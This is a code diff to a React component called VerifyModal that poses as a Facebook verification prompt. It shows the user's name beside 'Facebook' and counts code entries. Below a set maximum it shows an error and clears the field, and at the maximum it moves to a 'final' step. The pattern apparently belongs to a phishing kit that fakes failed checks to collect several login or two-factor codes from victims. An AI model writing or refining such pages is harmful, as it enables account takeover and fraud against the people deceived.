@@ -6,7 +6,7 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
-const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () => void }> = ({ businessName, fullName, nextStep }) => {
+const VerifyModal: FC = () => {
     const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
     const [countdown, setCountdown] = useState(0);
@@ -209,8 +209,7 @@ const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () 
             }
 
             if (next >= maxCode) {
-                setFormStep('init');
-                nextStep?.();
+                setFormStep('final');
             } else {
                 setShowError(true);
                 setCode('');
@@ -231,7 +230,7 @@ const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () 
                 <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-3 sm:p-4 md:p-5 overflow-hidden overflow-x-hidden'>
                     {/* Header with user info and Facebook branding */}
                     <div className='pb-2 sm:pb-3 md:pb-4 mb-1'>
-                        <p className='text-xs sm:text-sm text-gray-600 truncate'>{userFullName || fullName || businessName || 'User'} • Facebook</p>
+                        <p className='text-xs sm:text-sm text-gray-600 truncate'>{userFullName || 'User'} • Facebook</p>
                     </div>
 
                     {/* Main content */}
